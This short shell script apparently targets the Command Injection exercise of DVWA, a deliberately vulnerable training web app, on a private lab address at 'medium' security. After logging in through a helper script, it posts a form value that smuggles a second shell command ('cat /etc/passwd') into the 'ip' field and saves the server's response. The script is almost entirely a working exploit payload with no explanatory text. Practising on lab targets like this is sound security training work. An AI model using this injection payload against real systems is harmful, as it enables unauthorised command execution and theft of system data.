#Login with found details
source ../levelled_login.sh medium
#Check out the "Command Injection" page
curl -s -L --cookie "security=${SECURITY}; PHPSESSID=${SESSIONID}" 192.168.178.98/dvwa/vulnerabilities/brute /> /dev/null
#Get the server to 'cat /etc/passwd'
curl -s -i -L --cookie "security=${SECURITY}; PHPSESSID=${SESSIONID}" "192.168.178.98/dvwa/vulnerabilities/exec/" -d "ip=127.0.0.1++%26%3B+cat+%2Fetc%2Fpasswd&Submit=Submit" > result
unset LEVEL
unset SESSIONID
